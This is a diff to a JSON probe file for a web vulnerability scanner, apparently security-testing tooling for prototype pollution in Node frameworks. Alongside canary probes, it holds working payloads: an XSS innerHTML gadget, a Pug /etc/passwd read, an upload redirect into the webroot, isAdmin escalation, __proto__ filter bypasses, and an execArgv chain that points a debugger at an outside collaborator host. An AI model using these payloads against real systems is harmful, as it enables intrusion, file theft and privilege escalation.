@@ -2,15 +2,36 @@
   "category": "prototype_pollution",
   "contexts": {
     "server_side": {
-      "description": "Server-side prototype pollution via JSON body — tests __proto__ and constructor.prototype injection to modify object behavior",
-      "tech_match": ["Node.js", "Express", "Koa", "Fastify", "Next.js", "NestJS"],
-      "param_match": ["__proto__", "constructor", "data", "config", "settings", "options", "merge"],
+      "description": "Server-side prototype pollution via JSON body \u2014 tests __proto__ and constructor.prototype injection to modify object behavior",
+      "tech_match": [
+        "Node.js",
+        "Express",
+        "Koa",
+        "Fastify",
+        "Next.js",
+        "NestJS"
+      ],
+      "param_match": [
+        "__proto__",
+        "constructor",
+        "data",
+        "config",
+        "settings",
+        "options",
+        "merge"
+      ],
       "probes": [
         {
           "payload": "{\"__proto__\":{\"polluted\":\"pp_canary_7x8k2\"}}",
-          "description": "Basic __proto__ pollution with canary value — if reflected in subsequent response, prototype chain is writable",
+          "description": "Basic __proto__ pollution with canary value \u2014 if reflected in subsequent response, prototype chain is writable",
           "matchers": [
-            {"type": "word", "words": ["pp_canary_7x8k2"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "pp_canary_7x8k2"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -18,9 +39,14 @@
         },
         {
           "payload": "{\"__proto__\":{\"status\":510}}",
-          "description": "Prototype pollution to override HTTP status code — 510 Not Extended confirms server-side pollution",
+          "description": "Prototype pollution to override HTTP status code \u2014 510 Not Extended confirms server-side pollution",
           "matchers": [
-            {"type": "status", "status": [510]}
+            {
+              "type": "status",
+              "status": [
+                510
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -28,9 +54,15 @@
         },
         {
           "payload": "{\"constructor\":{\"prototype\":{\"polluted\":\"pp_canary_7x8k2\"}}}",
-          "description": "Constructor.prototype pollution variant — bypasses __proto__ keyword filters while achieving same effect",
+          "description": "Constructor.prototype pollution variant \u2014 bypasses __proto__ keyword filters while achieving same effect",
           "matchers": [
-            {"type": "word", "words": ["pp_canary_7x8k2"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "pp_canary_7x8k2"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 65,
@@ -39,15 +71,32 @@
       ]
     },
     "client_side": {
-      "description": "Client-side prototype pollution via query parameters — tests __proto__ bracket notation injection through URL params",
-      "tech_match": ["AngularJS", "jQuery", "Lodash", "Vue.js", "React"],
-      "param_match": ["__proto__", "constructor", "data", "config", "settings", "options", "merge"],
+      "description": "Client-side prototype pollution via query parameters \u2014 tests __proto__ bracket notation injection through URL params",
+      "tech_match": [
+        "AngularJS",
+        "jQuery",
+        "Lodash",
+        "Vue.js",
+        "React"
+      ],
+      "param_match": [
+        "__proto__",
+        "constructor",
+        "data",
+        "config",
+        "settings",
+        "options",
+        "merge"
+      ],
       "probes": [
         {
           "payload": "?__proto__[polluted]=pp_canary_7x8k2",
-          "description": "Query param __proto__ pollution with canary — reflection confirms client-side prototype chain modification",
+          "description": "Query param __proto__ pollution with canary \u2014 reflection confirms client-side prototype chain modification",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "medium",
           "confidence_boost": 40,
@@ -55,9 +104,12 @@
         },
         {
           "payload": "?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
-          "description": "Client-side prototype pollution to XSS via innerHTML gadget — onerror reflection confirms exploitable sink",
+          "description": "Client-side prototype pollution to XSS via innerHTML gadget \u2014 onerror reflection confirms exploitable sink",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -66,15 +118,33 @@
       ]
     },
     "detection": {
-      "description": "Generic prototype pollution detection probes — baseline comparison to detect behavioral changes from polluted prototypes",
-      "tech_match": ["Node.js", "Express", "Koa", "Fastify", "Next.js", "NestJS"],
-      "param_match": ["__proto__", "constructor", "data", "config", "settings", "options", "merge"],
+      "description": "Generic prototype pollution detection probes \u2014 baseline comparison to detect behavioral changes from polluted prototypes",
+      "tech_match": [
+        "Node.js",
+        "Express",
+        "Koa",
+        "Fastify",
+        "Next.js",
+        "NestJS"
+      ],
+      "param_match": [
+        "__proto__",
+        "constructor",
+        "data",
+        "config",
+        "settings",
+        "options",
+        "merge"
+      ],
       "probes": [
         {
           "payload": "{\"__proto__\":{\"xxx\":\"yyy\"}}",
-          "description": "Minimal __proto__ injection with generic key/value — response body length difference from baseline indicates pollution side effect",
+          "description": "Minimal __proto__ injection with generic key/value \u2014 response body length difference from baseline indicates pollution side effect",
           "matchers": [
-            {"type": "length_diff", "min_diff": 10}
+            {
+              "type": "length_diff",
+              "min_diff": 10
+            }
           ],
           "severity": "medium",
           "confidence_boost": 30,
@@ -84,100 +154,414 @@
     },
     "ejs_template_gadget": {
       "description": "EJS template engine reads outputFunctionName, escapeFunction, compileDebug from prototype. Polluting Object.prototype.outputFunctionName with attacker JS yields RCE on next render. Fixed in EJS 3.1.7+; older versions widely deployed. Refer to PortSwigger and HackTricks 'EJS prototype pollution' for full payload.",
-      "tech_match": ["node", "express", "ejs"],
+      "tech_match": [
+        "node",
+        "express",
+        "ejs"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"__proto__\":{\"outputFunctionName\":\"<EJS-RCE-PAYLOAD>\"}}",
-          "description": "[Manual] EJS RCE gadget — use a published payload from PortSwigger / HackTricks that breaks out of the outputFunctionName context and runs spawn-style JS. Verify with id/whoami marker in response.",
+          "description": "[Manual] EJS RCE gadget \u2014 use a published payload from PortSwigger / HackTricks that breaks out of the outputFunctionName context and runs spawn-style JS. Verify with id/whoami marker in response.",
           "matchers": [
-            {"type": "word", "any": ["uid=", "gid="]},
-            {"type": "status", "status": [200, 500]}
+            {
+              "type": "word",
+              "any": [
+                "uid=",
+                "gid="
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "pug_compile_options_gadget": {
-      "description": "Pug template engine respects pretty, self, globals, compileDebug, filename from compile options. Pollute filename with traversal path and trigger render — file disclosure or RCE depending on filter.",
-      "tech_match": ["node", "express", "pug"],
+      "description": "Pug template engine respects pretty, self, globals, compileDebug, filename from compile options. Pollute filename with traversal path and trigger render \u2014 file disclosure or RCE depending on filter.",
+      "tech_match": [
+        "node",
+        "express",
+        "pug"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"__proto__\":{\"compileDebug\":true,\"filename\":\"/etc/passwd\"}}",
-          "description": "Pug filename gadget — render error includes file content when compileDebug=true.",
+          "description": "Pug filename gadget \u2014 render error includes file content when compileDebug=true.",
           "matchers": [
-            {"type": "word", "any": ["root:x:0:0", "daemon:"]}
+            {
+              "type": "word",
+              "any": [
+                "root:x:0:0",
+                "daemon:"
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 65,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "express_fileupload_rename_gadget": {
       "description": "express-fileupload <1.4.0 reads parseNested, useTempFiles, tempFileDir from prototype. Polluting tempFileDir to a writable webroot path makes uploaded files reachable as static content (RCE if PHP/JSP allowed in that dir).",
-      "tech_match": ["node", "express-fileupload"],
+      "tech_match": [
+        "node",
+        "express-fileupload"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"__proto__\":{\"useTempFiles\":true,\"tempFileDir\":\"/var/www/html/\"}}",
           "description": "Pollute tempFileDir to webroot. Subsequent file upload lands in static-served directory.",
           "matchers": [
-            {"type": "status", "status": [200, 201]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
           ],
           "severity": "critical",
           "confidence_boost": 60,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "mongoose_schema_pollution": {
-      "description": "Mongoose schema option fields (autoIndex, collection, versionKey, strict) are read from prototype. Setting strict=false lets attacker write arbitrary fields — bypasses schema validation and enables IDOR/role escalation if downstream code trusts schema.",
-      "tech_match": ["mongoose", "mongodb", "node"],
+      "description": "Mongoose schema option fields (autoIndex, collection, versionKey, strict) are read from prototype. Setting strict=false lets attacker write arbitrary fields \u2014 bypasses schema validation and enables IDOR/role escalation if downstream code trusts schema.",
+      "tech_match": [
+        "mongoose",
+        "mongodb",
+        "node"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{\"__proto__\":{\"strict\":false}}",
           "description": "Pollute Mongoose strict mode = false. Subsequent .create({role:'admin'}) succeeds even when schema doesn't include role.",
           "matchers": [
-            {"type": "status", "status": [200, 201]}
+            {
+              "type": "status",
+              "status": [
+                200,
+                201
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     },
     "lodash_set_value_chain": {
-      "description": "lodash _.set / _.merge / set-value — multi-step pollution via attacker-controlled keypath string. Path traversal-style '__proto__.isAdmin' becomes nested object set.",
-      "tech_match": ["lodash", "node", "set-value"],
-      "param_match": ["path", "key"],
+      "description": "lodash _.set / _.merge / set-value \u2014 multi-step pollution via attacker-controlled keypath string. Path traversal-style '__proto__.isAdmin' becomes nested object set.",
+      "tech_match": [
+        "lodash",
+        "node",
+        "set-value"
+      ],
+      "param_match": [
+        "path",
+        "key"
+      ],
       "probes": [
         {
           "payload": "{\"path\":\"__proto__.isAdmin\",\"value\":true}",
           "description": "set-value pollution via keypath string. Subsequent if (user.isAdmin) checks pass for any user.",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "word", "any": ["admin", "permission"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "admin",
+                "permission"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
         },
         {
           "payload": "{\"path\":\"constructor.prototype.isAdmin\",\"value\":true}",
-          "description": "Alternate path defeating __proto__ filtering — constructor.prototype is functionally equivalent.",
+          "description": "Alternate path defeating __proto__ filtering \u2014 constructor.prototype is functionally equivalent.",
           "matchers": [
-            {"type": "status", "status": [200]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 45,
-          "variables": {"manual_chain": true}
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "express_default_property_pollution": {
+      "description": "Express deeply-merging req.body into a target object. Pollution of `status` / `statusCode` / `json spaces` Express response defaults observable via altered behavior across unrelated endpoints.",
+      "tech_match": [
+        "express",
+        "node.js",
+        "node"
+      ],
+      "param_match": [
+        "__proto__",
+        "constructor",
+        "prototype"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"json spaces\":4}}",
+          "description": "Pollute Express json-spaces; subsequent JSON responses gain 4-space indentation",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "pattern": "^\\{\\n    \"",
+              "weight": 80
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{\"__proto__\":{\"status\":510}}",
+          "description": "Pollute response.status default. Next API call returns HTTP 510 with no business logic firing",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                510
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    },
+    "constructor_prototype_gadget": {
+      "description": "`__proto__` filtered, but `constructor.prototype.X` walks the same prototype chain. Always test both forms when one is rejected.",
+      "tech_match": [
+        "express",
+        "fastify",
+        "hapi",
+        "koa",
+        "nestjs"
+      ],
+      "param_match": [
+        "constructor",
+        "prototype"
+      ],
+      "probes": [
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"polluted\":\"COLLABORATOR\"}}}",
+          "description": "Bypass naive __proto__ filter via constructor.prototype",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "collaborator",
+              "weight": 80
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {
+            "collaborator": "{{collaborator}}"
+          }
+        }
+      ]
+    },
+    "fastify_ajv_pollution": {
+      "description": "Fastify AJV schema compilation reads $defs / $ref. Pollution of these via __proto__ poisons input validation across the application.",
+      "tech_match": [
+        "fastify",
+        "ajv"
+      ],
+      "param_match": [
+        "__proto__"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"$ref\":\"#/$defs/never\"}}",
+          "description": "Pollute AJV schema. Following requests with bodies hit a validation hang or 500",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                400,
+                500
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "word",
+              "words": [
+                "AJV",
+                "schema",
+                "validation"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "exec_argv_rce_chain": {
+      "description": "PortSwigger 2023 \u2014 Node child_process spawn picks up polluted execArgv across the runtime. Combined with `--experimental-vm-modules` toggle, leads to arbitrary code in spawned child. Use --inspect to confirm: presence of `Debugger listening on` in logs after pollution implies arbitrary --inspect flag accepted.",
+      "tech_command": [
+        "node",
+        "express",
+        "fastify",
+        "hapi"
+      ],
+      "param_match": [
+        "__proto__",
+        "constructor"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"execArgv\":[\"--inspect=COLLABORATOR:9229\"]}}",
+          "description": "Pollute execArgv. Next child_process.spawn / fork inherits --inspect flag pointing to attacker",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "weight": 100
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {
+            "collaborator": "{{collaborator}}"
+          }
+        }
+      ]
+    },
+    "hapi_event_pollution": {
+      "description": "Hapi server.events.emit reads from internal config that's prototype-walked. Polluted entries fire on every request.",
+      "tech_match": [
+        "hapi",
+        "@hapi/hapi"
+      ],
+      "param_match": [
+        "__proto__"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"onRequest\":true}}",
+          "description": "Pollute Hapi onRequest handler default. Next request 500s with internal handler missing",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "words": [
+                "Internal",
+                "handler",
+                "Cannot"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "side_channel_status_delta": {
+      "description": "Generic detection \u2014 pollute Object.prototype.fooBarBaz with unique sentinel, then call sibling endpoint and grep response for the sentinel. If any code path enumerates `for (k in obj)` over a non-Object.create(null) object, sentinel will appear.",
+      "tech_match": [
+        "express",
+        "fastify",
+        "hapi",
+        "koa",
+        "nestjs",
+        "node.js"
+      ],
+      "param_match": [
+        "__proto__"
+      ],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"praetorSentinelXYZ\":\"PRAETORMARK\"}}",
+          "description": "Side-channel probe \u2014 sentinel reflected back in unrelated API response is confirmation",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "PRAETORMARK|praetorSentinelXYZ",
+              "weight": 95
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
         }
       ]
     }
-  }
+  },
+  "description": ". v1.0 black-box variants: Express default-property pollution (json spaces / status), Fastify AJV pollution, Hapi event pollution, exec_argv RCE chain, side-channel sentinel detection."
 }
